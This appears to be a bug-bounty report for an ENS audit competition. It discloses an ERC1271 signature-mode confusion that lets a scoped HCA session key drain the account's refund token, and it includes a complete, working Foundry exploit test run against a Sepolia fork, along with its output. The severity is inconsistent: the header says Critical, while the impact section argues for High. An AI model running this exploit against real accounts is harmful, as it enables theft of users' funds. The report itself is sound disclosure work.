# 93043 w a critical erc1271 signature mode confusion lets a bounded hca session drain the account s refund token

**Submitted on Sep 14th 2026 at 03:37:09 UTC by @hyuunn for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93043
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/transaction-manager>
* **Impacts:**
  * Unauthorized takeover of a user's smart account (Hybrid Custody Account) or authenticated session, letting an attacker transfer the victim's names or funds or act as them, such as: - adding, replacing, or escalating an account owner or co-owner - extending or widening a session key's authority beyond its intended scope or lifetime - stealing an authenticated session or bearer token (Exploiting the 7-day session-key design as described in the Known Issues is not eligible; a weakness that grants authority beyond its stated lifetime or permissions is in scope.)

## Description

## Description

### Brief/Intro

A holder of a valid, time-bounded Standalone HCA session key can drain the HCA's configured refund token by submitting same-chain intents with attacker-chosen refund parameters and an attacker-controlled recipient. The in-scope integration passes the scoped key through Rhinestone's `experimental_session` signer, but the same-chain HCA path produces ERC1271 mode; the deployed IntentExecutor treats that mode as owner-authorized and settles the ERC20 gas refund directly instead of requiring the session-specific refund callback. On a pinned Sepolia fork, this transferred up to 84.227220 MockUSDC per operation and 239.247260 MockUSDC over three fresh nonces.

### Vulnerability Details

The application creates a 24-hour HCA session with explicit refund limits. `packages/smart-account/src/providers/rhinestone/session.ts`, in `buildEnableSessionWithRefundCall`, installs the session with the configured token and maximum refund parameters:

```typescript
export function buildEnableSessionWithRefundCall(params: {
  readonly chainId: number
  readonly permissionId: Hex
  readonly sessionKey: Address
  readonly validUntil: bigint
  readonly resolver: Address
}): { to: Address; value: bigint; data: Hex } {
  const c = getDestinationContracts(params.chainId)
  return {
    to: c.hcaOwnerAndSessionValidator,
    value: 0n,
    data: encodeFunctionData({
      abi: enableSessionWithRefundAbi,
      functionName: 'enableSessionWithRefund',
      args: [
        params.permissionId,
        params.sessionKey,
        Number(params.validUntil),
        params.resolver,
        c.usdc,
        MAX_REFUND_EXCHANGE_RATE,
        Number(MAX_REFUND_GAS_OVERHEAD),
        MAX_REFUND_AMOUNT,
      ],
    }),
  }
}
```

At the pinned revision, `MAX_REFUND_EXCHANGE_RATE`, `MAX_REFUND_GAS_OVERHEAD`, and `MAX_REFUND_AMOUNT` are respectively `20_000_000_000`, `500_000`, and `100_000_000` (100 MockUSDC). The limits constrain each refund, but do not make the session key an owner or authorize it to select itself as the recipient of a direct owner refund.

`packages/transaction-manager/src/actors/warp-transport.actor.ts` then sends an active scoped session to the SDK as follows:

```typescript
const sessionSigners = signer.session
  ? ({
      type: 'experimental_session' as const,
      session: signer.session.session,
      ...(sessionEnableData ? { enableData: sessionEnableData } : {}),
      verifyExecutions: true,
    } satisfies NonNullable<Transaction['signers']>)
  : undefined
```

For a same-chain Standalone HCA transaction, the installed SDK path signs the resulting intent using ERC1271 mode (`0x0201`). The deployed HCA correctly asks `HCAOwnerAndSessionValidator` to validate the scoped session envelope and allowed execution. However, after that validation succeeds, the deployed IntentExecutor classifies ERC1271 mode as owner-authorized and calls the direct refund settlement path. It does not invoke the refund callback that distinguishes a session-key execution from an owner execution. Changing only the signature mode to `ERC1271_EMISSARYEXECUTION` (`0x0206`) makes the same transaction call the callback-protected path and revert with `Unauthorized()` because no callback authorization exists.

The attacker needs only an active ECDSA session key created through the normal application flow and a fresh IntentExecutor nonce. The attacker does not need the HCA owner key, factory ownership, validator administration, executor upgrade authority, token minter authority, a malicious relayer, a race, or timestamp manipulation.

The exploit proceeds as follows:

1. The legitimate owner approves the normal setup bundle, which funds the HCA and enables a 24-hour session with the application's refund token and caps.
2. The session-key holder creates an otherwise allowlisted operation containing `approve(paymaster, 100_000_000)` for the configured token.
3. The session-key holder signs a same-chain ERC1271 intent with the exchange rate and gas overhead raised up to the session's signed limits and sets an attacker-controlled refund recipient.
4. The attacker submits the intent directly to the public `executeSinglechainOpsWithGasRefund_ERC20` entry point.
5. The deployed validator accepts the session envelope and execution because the values remain within the installed caps.
6. Because the mode is ERC1271, IntentExecutor skips the session-key refund callback and the Paymaster transfers the calculated refund from the HCA to the attacker.
7. The attacker repeats the operation with fresh nonces until the HCA token balance is exhausted, the owner revokes the session, or the session expires.

### Impact Details

The affected party is the owner of the Standalone HCA. Each successful operation permanently decreases the HCA's configured refund-token balance and increases the attacker recipient's balance by the same amount. On the pinned Sepolia fork, an attacker-selected exchange rate paid 84.227220 MockUSDC while the lower-rate control paid 7.363185 MockUSDC for the same operation. Three fresh nonces transferred 239.247260 MockUSDC in total. A test using the 29.540306 MockUSDC balance observed during a normal setup/cooldown window transferred 29.479527 MockUSDC and left less than 1.5 MockUSDC.

The signed maximum is 100 MockUSDC per operation. Because the attack works with fresh nonces, the aggregate bound is the first of the HCA's token balance, session expiry or revocation, and the number of transactions. The currently reachable loss depends on whether an attacker possesses an active session key and on each HCA's balance. The test deployment is on Sepolia and the affected token is MockUSDC, so no unsupported fiat valuation is asserted. The demonstrated direct account-balance drain and authorization-boundary failure support High severity, while the valid bounded session credential, token restriction, 100-token per-operation cap, 24-hour expiry, and owner revocation keep the impact below Critical.

**Impact:** Direct theft, unauthorized draining, or permanent freezing of user funds (ETH, USDC, DAI) or smart account balances.

### References

* [Session refund limits passed to `enableSessionWithRefund`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/smart-account/src/providers/rhinestone/session.ts#L270-L304)
* [Configured 24-hour session duration and refund caps](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/smart-account/src/providers/rhinestone/manifest.ts#L189-L205)
* [Warp transport passes scoped sessions with execution verification enabled](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/actors/warp-transport.actor.ts#L107-L120)

## Proof of Concept

## Proof of Concept

Run the test against a Sepolia fork pinned to block `11,696,721` (block hash `0x1e00286d3b873df26b15b6eeac19947a69fd0a7fedf804745ee179652bc63007`). It requires Foundry with Solidity 0.8.28, Cancun EVM, `via_ir = true`, `forge-std`, and an RPC endpoint available as `https://sepolia.gateway.tenderly.co`. Save the following file as `test/HcaRefundMode.t.sol` in a Foundry project.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";

struct Execution { address target; uint256 value; bytes callData; }

interface IValidator {
    function enableSessionWithRefund(bytes32 permissionId, address sessionKey, uint48 validUntil, address resolver, address refundToken, uint96 maxRefundExchangeRate, uint48 maxRefundGasOverhead, uint96 maxRefundAmount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IIntentExecutor {
    struct Operation { bytes data; }
    struct SingleChainOps { address account; uint256 nonce; Operation ops; bytes signature; }
    struct GasRefund { address token; uint256 exchangeRate; uint256 overhead; }
    function executeSinglechainOpsWithGasRefund_ERC20(SingleChainOps calldata signedOps, GasRefund calldata gasRefund, address gasRefundRecipient) external returns (address account, uint256 nonce);
}

interface IStandaloneHcaFactory {
    function deploy(address owner, address hcaImplementation, uint256 userSalt) external returns (address hca);
}

interface IStandaloneHca {
    function executeByOwner(Execution[] calldata executions) external payable;
}

contract HcaRefundModeTest is Test {
    IValidator internal constant VALIDATOR = IValidator(0x5f249FCa8bB4949105651146858c347E8BFb0F7E);
    IIntentExecutor internal constant EXECUTOR = IIntentExecutor(0x00000000005aD9ce1f5035FD62CA96CEf16AdAAF);
    IStandaloneHcaFactory internal constant HCA_FACTORY = IStandaloneHcaFactory(0x900FF7cF617Ef9D802178B4ef480491e3A782672);
    address internal constant HCA_IMPLEMENTATION = 0xAA761541620fC1a42bb701a26a9f107A9DF1E904;
    IERC20 internal constant USDC = IERC20(0x768F42455A2D082E23ceeF7d51e5787C82d67a39);
    address internal constant PAYMASTER = 0x1d7df6Ddc7328Ac827EB4D7f171C60AFB7f9A599;
    address internal constant SESSION_VALIDATOR = 0x000000000013fdB5234E4E3162a810F54d9f7E98;
    bytes32 internal constant OP_TYPEHASH = 0xdbc520cb50a8aaf3fa06ea43dc3d59d248e52ae638476e3268a1e6e36bffe196;
    bytes32 internal constant EXECUTION_TYPEHASH = 0x09b0a32e9842b65559835c235891737e06927d59e48a6f0e0512e136a513a9e4;
    bytes32 internal constant SINGLE_CHAIN_TYPEHASH = 0xbae11135c33effc421d699bbb53d9926a005ed0f2f5eb672c62cbfa943807291;
    bytes32 internal constant REFUND_TYPEHASH = 0x0bf04d9dcc5e703a75ba16d19c00f9d87fa30b9a815627102c15624d338eb094;
    uint256 internal sessionKey = 0xA11CE;
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal hca;
    bytes32 internal permissionId;

    function setUp() external {
        vm.createSelectFork("https://sepolia.gateway.tenderly.co", 11_696_721);
        hca = HCA_FACTORY.deploy(owner, HCA_IMPLEMENTATION, 0);
        address[] memory owners = new address[](1);
        owners[0] = vm.addr(sessionKey);
        bytes32 salt = keccak256(abi.encode(uint96(0), uint48(block.timestamp + 1 days), address(0), address(USDC), uint96(20_000_000_000), uint48(500_000), uint96(100_000_000)));
        permissionId = keccak256(abi.encode(SESSION_VALIDATOR, abi.encode(uint256(1), owners), salt));
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: address(VALIDATOR), value: 0, callData: abi.encodeCall(IValidator.enableSessionWithRefund, (permissionId, vm.addr(sessionKey), uint48(block.timestamp + 1 days), address(0), address(USDC), uint96(20_000_000_000), uint48(500_000), uint96(100_000_000)))});
        vm.prank(owner);
        IStandaloneHca(hca).executeByOwner(executions);
        deal(address(USDC), hca, 400_000_000, true);
    }

    function test_erc1271SessionBypassesRefundCallback() external {
        vm.txGasPrice(7 gwei);
        uint256 crafted = _executeRefund(1, 20_000_000_000, attacker);
        uint256 normal = _executeRefund(2, 1_900_000_000, makeAddr("honestRelayer"));
        emit log_named_uint("crafted refund", crafted);
        emit log_named_uint("normal refund", normal);
        assertGt(crafted, normal * 9);
        assertGt(crafted, 70_000_000);
    }

    function test_repeatsAcrossFreshIntentNonces() external {
        vm.txGasPrice(7 gwei);
        uint256 stolen = _executeRefund(11, 20_000_000_000, attacker);
        stolen += _executeRefund(12, 20_000_000_000, attacker);
        stolen += _executeRefund(13, 20_000_000_000, attacker);
        emit log_named_uint("three-operation refund", stolen);
        assertGt(stolen, 200_000_000);
    }

    function test_drainsObservedCooldownBalance() external {
        deal(address(USDC), hca, 29_540_306, true);
        vm.txGasPrice(7 gwei);
        uint256 stolen = _executeRefund(31, 7_000_000_000, attacker);
        emit log_named_uint("observed-balance refund", stolen);
        assertGt(stolen, 28_000_000);
        assertLt(USDC.balanceOf(hca), 1_500_000);
    }

    function test_executionEmissaryModeRequiresRefundCallback() external {
        vm.txGasPrice(7 gwei);
        _executeRefundWithMode(21, 20_000_000_000, attacker, bytes2(0x0206), true);
    }

    function _executeRefund(uint256 nonce, uint256 exchangeRate, address recipient) internal returns (uint256 received) {
        return _executeRefundWithMode(nonce, exchangeRate, recipient, bytes2(0x0201), false);
    }

    function _executeRefundWithMode(uint256 nonce, uint256 exchangeRate, address recipient, bytes2 mode, bool expectCallbackRevert) internal returns (uint256 received) {
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: address(USDC), value: 0, callData: abi.encodeCall(IERC20.approve, (PAYMASTER, 100_000_000))});
        uint256 packedOverhead = (uint256(100_000_000) << 128) | 500_000;
        bytes32 digest = _digest(nonce, executions, exchangeRate, packedOverhead, mode);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sessionKey, digest);
        bytes memory operationData = abi.encodePacked(bytes32(mode), abi.encode(executions));
        bytes memory envelope = abi.encodePacked(bytes1(0x02), permissionId, nonce, address(USDC), exchangeRate, packedOverhead, operationData, r, s, v);
        IIntentExecutor.SingleChainOps memory signedOps = IIntentExecutor.SingleChainOps({account: hca, nonce: nonce, ops: IIntentExecutor.Operation({data: abi.encodePacked(mode, abi.encode(executions))}), signature: abi.encodePacked(address(0), envelope)});
        IIntentExecutor.GasRefund memory refund = IIntentExecutor.GasRefund({token: address(USDC), exchangeRate: exchangeRate, overhead: packedOverhead});
        uint256 beforeBalance = USDC.balanceOf(recipient);
        if (expectCallbackRevert) vm.expectRevert(bytes4(keccak256("Unauthorized()")));
        EXECUTOR.executeSinglechainOpsWithGasRefund_ERC20(signedOps, refund, recipient);
        received = USDC.balanceOf(recipient) - beforeBalance;
    }

    function _digest(uint256 nonce, Execution[] memory executions, uint256 exchangeRate, uint256 packedOverhead, bytes2 mode) internal view returns (bytes32) {
        bytes32[] memory executionHashes = new bytes32[](executions.length);
        for (uint256 i; i < executions.length; ++i) {
            executionHashes[i] = keccak256(abi.encode(EXECUTION_TYPEHASH, executions[i].target, executions[i].value, keccak256(executions[i].callData)));
        }
        bytes32 operationHash = keccak256(abi.encode(OP_TYPEHASH, bytes32(mode), keccak256(abi.encodePacked(executionHashes))));
        bytes32 refundHash = keccak256(abi.encode(REFUND_TYPEHASH, address(USDC), exchangeRate, packedOverhead));
        bytes32 structHash = keccak256(abi.encode(SINGLE_CHAIN_TYPEHASH, hca, nonce, operationHash, refundHash));
        bytes32 domain = keccak256(abi.encode(keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"), keccak256("IntentExecutor"), keccak256("v0.0.1"), block.chainid, address(EXECUTOR)));
        return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
    }
}
```

Run:

```bash
forge fmt --check
forge test -vv
```

The relevant observed output is:

```
[PASS] test_drainsObservedCooldownBalance()
  observed-balance refund: 29479527
[PASS] test_erc1271SessionBypassesRefundCallback()
  crafted refund: 84227220
  normal refund: 7363185
[PASS] test_executionEmissaryModeRequiresRefundCallback()
[PASS] test_repeatsAcrossFreshIntentNonces()
  three-operation refund: 239247260
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

The ERC1271 test proves that a scoped session receives the direct refund without a callback; the emissary-mode negative control changes only the signature mode and reverts because callback authorization is absent. The low-rate control shows the same operation receiving 7.363185 MockUSDC instead of the attacker-crafted 84.227220 MockUSDC, and the fresh-nonce test proves repeatability.
